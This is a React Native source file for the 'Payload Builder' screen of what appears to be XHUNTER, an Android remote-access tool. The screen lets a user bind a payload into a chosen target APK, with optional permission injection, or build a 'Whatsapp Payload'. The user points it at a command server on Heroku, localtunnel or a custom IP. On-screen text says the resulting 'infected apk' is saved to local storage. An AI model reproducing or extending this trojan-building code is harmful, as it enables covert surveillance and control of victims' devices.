import React, { useEffect, useState } from "react";
import { PermissionsAndroid,TouchableOpacity, DeviceEventEmitter } from 'react-native';
import { 
    Box,
    StatusBar, 
    Icon,
    Button,
    PresenceTransition,
    Badge,
    Stack,
    IconButton,
    Text,
    FormControl,
    Input,
    Select,
    Link,
    Checkbox,
    HStack,
    useToast,
    Spacer,
    ScrollView
} from "native-base";
import DocumentPicker from 'react-native-document-picker'
import RNFetchBlob from 'rn-fetch-blob'
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
import MaterialIcons from 'react-native-vector-icons/MaterialIcons';
import FontAwesome from 'react-native-vector-icons/FontAwesome';
// redux
import { useDispatch, useSelector } from '../../redux/store';
import { addBuildPayloadLogs } from '../../redux/slices/userInfo'

// components
import BuildLogScreen from '../../components/BuildLogScreen'

import AppBuilder from '../../native-modules/AppBuilder'


 const ERRORS={
    payloadError:false,
    serverError:false,
    hostError:false

 }       

   
const PayloadBuilder = ({navigation}) => {
    const dispatch = useDispatch();
    const toast = useToast();
    const [config, setConfig]=useState({
        payloadType:null,
        server:null,
        host:null,
        targetApk:null,
    });
    const [error,setError]=useState(ERRORS);
    const [injectPermission,setInjectPermission]=useState(false);

    const [visible, setVisible]= useState(false);
    const { subdomain } = useSelector((state) => state.userInfo);

  useEffect(()=>{
   const sub = DeviceEventEmitter.addListener('log', addlog);
   return ()=>{ sub.remove();}
  },[])

  useEffect(()=>{
   if(config.server==='localtunnel'){
        setConfig({...config,host:`https://${subdomain}.loca.lt`})
   }else{
        setConfig({...config,host:''})
   }
   },[config.server])

   useEffect(()=>{
    setError(ERRORS)
   },[config])

const addlog =( data ) => { 
    let type = Object.keys(data)[0];
    let message= data[type];
    dispatch(addBuildPayloadLogs({ type, message})) 
}
  
const handleBuilder=async()=>{
    if(validate()){
    const granted = await PermissionsAndroid.check( PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE );
        if (granted) {
            if(config.payloadType=='whatsapp'){
                setVisible(true);
                AppBuilder.bindWhatsapp(config.host)
            }else if(config.payloadType=='bind'){
                buildBind();
            }
        }else{
            requestPermission();
        }
  }
}
const buildBind = async()=>{
    if(!config.targetApk){
        toast.show({
            title: "No target apk selected",
            status: "error",
            placement: "top",
            description: "Please select *.apk file"
          })
     }else{
        RNFetchBlob.fs.stat(config.targetApk.uri).then((stats) => { 
            if(stats.path){
                setVisible(true)
                AppBuilder.bindApp(stats.path, config.host, injectPermission)
            }else{
                toast.show({
                    title: "Target apk selected corrupt",
                    status: "error",
                    placement: "top",
                    description: "Please select *.apk file again"
                  })
            }
            }).catch((err) => {
                toast.show({
                    title: "Target apk selected corrupt",
                    status: "error",
                    placement: "top",
                    description: "Please select *.apk file again"
                  })
                console.log(err)
            });
    }
  }
const handleBrowse =async()=>{
    try {
    const pickerResult = await DocumentPicker.pickSingle({
        presentationStyle: 'fullScreen',
        copyTo: "documentDirectory",
      })
      if(pickerResult.name.endsWith(".apk")){
          setConfig({...config,targetApk:pickerResult});
      }else{
        toast.show({
            title: "Wrong file selected",
            status: "error",
            placement: "top",
            description: "Please select *.apk file"
          })
      }
    } catch (e) {
        console.log(e)
      }
}
const validate=()=>{
    if(config.payloadType==null){
        setError({...error,payloadError:true})
    }else if(config.server==null){
        setError({...error,serverError:true})
    }else if(config.host==null){
        setError({...error,hostError:true})
    }else if(!isUrlValid(config.host)){
        setError({...error,hostError:true})
    }else{
        return true;
    }
    return false;
}
const isUrlValid=(userInput)=> {
    var res = userInput.match(/(http(s)?:\/\/.)?(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/g);
    if(res == null)
        return false;
    else
        return true;
}
const requestPermission=async() =>{ 
     try {
          const granted = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE)
          if (granted!== PermissionsAndroid.RESULTS.GRANTED) {
               toast.show({ title: "Permission not granted", status: "error",placement: "top",description: "Please grant permission"})
          } 
        } catch (err) { } 
 }
  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop bg={"primary"}/>

    <Box flex={1} bg={"primary"} px={'2'} >
    <HStack my="4" alignItems="center" justifyContent={"space-between"} borderBottomWidth="1" borderBottomColor={'secondary.500'} >
      <IconButton 
         onPress={()=>navigation.goBack()}
         icon={<Icon as={MaterialCommunityIcons} name="chevron-left-circle" />} 
         borderRadius="full" 
         _icon={{ color:  "tertiary.500", size: "sm"}} 
         _pressed={{ bg: "tertiary.800:alpha.20"}}            
         />
        <Text pl={20} fontSize={'20'}  color={"secondary.500"}>Payload Builder</Text>
        <Spacer/>
    </HStack>
    <ScrollView showsVerticalScrollIndicator={false}>
        <Stack space={2} px={4} >
        <FormControl isInvalid={error.payloadError} >
            <FormControl.Label>Payload</FormControl.Label>
            <Select 
                selectedValue={config.payloadType}
                accessibilityLabel="Payload" 
                placeholder="Payload"
                variant={'filled'}
                _selectedItem={{ bg: "teal.600", endIcon:<Icon as={MaterialCommunityIcons} name="check" />  }}
                onValueChange={v => setConfig({...config,payloadType:v})}>
                    <Select.Item label="Bind + Payload" value="bind" />
                    <Select.Item label="Whatsapp Payload" value="whatsapp" />
            </Select>
            <FormControl.ErrorMessage leftIcon={ <Icon as={MaterialIcons} name={'warning'} color={"warning.400"} size="xs"/>}>
             Please select at least one option
            </FormControl.ErrorMessage>
        </FormControl>   
        <FormControl isInvalid={error.serverError} >
         <FormControl.Label>Server

         <PresenceTransition 
            visible={config.server=='heroku'||config.server=='custom'?true:false}
            initial={{
            opacity: 0,
            scale: 0,
             }} 
            animate={{
            opacity: 1,
            scale: 1,
            transition: {
              duration: 500,
            }
            }}>
        <Link href={config.server=='heroku'?"https://github.com/anirudhmalik/xhunter-server":"https://github.com/anirudhmalik/xhunter/discussions/18"} isExternal>
        <HStack alignItems="center" ml={2}>
          <Badge colorScheme="darkBlue" _text={{ color: "white"}} variant="solid" rounded="4">
              {config.server=='heroku'?"How to setup heroku server?":"How to setup custom server"}
           </Badge>
        </HStack>
         </Link></PresenceTransition>
         </FormControl.Label>
            <Select 
                selectedValue={config.server}
                accessibilityLabel="Server" 
                placeholder="Server"
                variant={'filled'}
                _selectedItem={{ bg: "teal.600", endIcon:<Icon as={MaterialCommunityIcons} name="check" />  }}
                onValueChange={v => setConfig({...config,server:v})}>
                    <Select.Item label="Heroku" value="heroku" />
                    <Select.Item label="localtunnel" value="localtunnel" />
                    <Select.Item label="Custom" value="custom" />
            </Select>
            <FormControl.ErrorMessage leftIcon={ <Icon as={MaterialIcons} name={'warning'} color={"warning.400"} size="xs"/>}>
             Please select at least one option
            </FormControl.ErrorMessage>
         </FormControl>
         <FormControl isInvalid={error.hostError} > 
            <FormControl.Label>Host</FormControl.Label>
            <Input 
                placeholder={config.server==='custom'?"http://13.42.165.24:8080":"https://xyz.herokuapp.com"}
                variant={'filled'}
                editable={config.server!=='localtunnel'}
                value={config.host}
                onChangeText={(v)=>setConfig({...config,host:v})}
                InputLeftElement={<Icon as={<MaterialCommunityIcons name="web" />} size={5} ml="2"  color="muted.400" />}
                />
            <FormControl.ErrorMessage leftIcon={ <Icon as={MaterialIcons} name={'warning'} color={"warning.400"} size="xs"/>}>
             Please enter valid url
            </FormControl.ErrorMessage>
        </FormControl>
            {config.payloadType=="bind"?<Checkbox 
                mt={4}
                colorScheme={'tertiary'} 
                value={injectPermission}
                onChange={setInjectPermission} 
                >
                Inject Permissions</Checkbox>:<></>}                
            <PresenceTransition 
            visible={injectPermission?true:false}
            initial={{
            opacity: 0,
            scale: 0,
             }} 
            animate={{
            opacity: 1,
            scale: 1,
            transition: {
              duration: 500,
            }
            }}><HStack space={2} >
                <Icon as={MaterialIcons} name={'warning'} color={"warning.400"} size="4"/>
                <Text color={"warning.400"} fontSize={12}>{"App build may fail on some apps"}</Text>
               </HStack></PresenceTransition>
               <PresenceTransition 
        visible={config.payloadType==="bind"?true:false}
        initial={{
            opacity: 0,
            scale: 0,
          }} 
        animate={{
            opacity: 1,
            scale: 1,
            transition: {
              duration: 500,
            }
          }}>
        {config.targetApk!=null?<Box bg="dark.100" borderRadius='10' px="2"  py="4" mb='4' >
        <HStack justifyContent="space-between" alignItems={'center'}>
            <Icon as={FontAwesome} name={"android"} color={"success.500"} size="8" mr="1"/>
            <Text fontSize={'14'}  color={"secondary.500"}>{config.targetApk.name}</Text>
            <Spacer/>
            <IconButton 
            onPress={()=>setConfig({...config,targetApk:null})}
            icon={<Icon as={MaterialCommunityIcons} name="close-circle" />} 
            borderRadius="full" 
            _icon={{ color:  "error.500", size: "sm"}} 
            _pressed={{ bg: "error.800:alpha.20"}}           
         />
        </HStack>
        </Box>:<TouchableOpacity  onPress={handleBrowse} >
        <Box bg="dark.100" borderRadius='10' borderWidth={1} borderStyle="dashed" borderColor="tertiary.400" py="10" mb='4' >
            <Text fontSize={'16'} textAlign="center" color={"white"}>DRAG TARGET APK HERE</Text>
            <Text fontSize={'16'} textAlign="center" color={"white"}>OR BROWSE</Text>
        </Box>
        </TouchableOpacity>}  
        <Box bg="dark.100" borderRadius='10' px="2"  py="2" mb='4' >
        <HStack space={2} alignItems={'center'}>
                <Icon as={MaterialIcons} name={'info'} color={"info.400"} size="4"/>
                <Text color={"info.400"} >{"Information"}</Text>
               </HStack>
        <Text fontSize={'14'}  color={"white"}>{"*Select apk which is less in size for fast build.  [ size < 30MB ]"}</Text>
        <Text fontSize={'14'}  color={"white"}>{"*It may sometime takes long time to build apk depending on your mobile benchmark"}</Text>
        <Text fontSize={'14'}  color={"white"}>{"*Please be patient during apk build, as it usually takes few minutes to complete"}</Text>
        <Text fontSize={'14'}  color={"white"}>{"*If it fails to build apk them try another apk"}</Text>
        <Text fontSize={'14'}  color={"white"}>{"*It takes around 10-20 minutes to build. [ may differ on apk size ]"}</Text>
        <Text fontSize={'14'}  color={"white"}>{"*After build success, the infected apk will be located in \"XHUNTER\\payload\" named folder in your internal storage "}</Text>
        </Box></PresenceTransition>
        </Stack>
    </ScrollView>
    <Button
         colorScheme={'tertiary'}
         onPress={()=>handleBuilder()}
         size={'lg'}
         mx={4}
         my={4}
         borderRadius={16}
        leftIcon={<Icon as={MaterialIcons} name="navigate-next" size="sm" />}
    />
    </Box>
    <BuildLogScreen visible={visible} navigation={navigation}/>
    </>
    )
};

export default PayloadBuilder;

  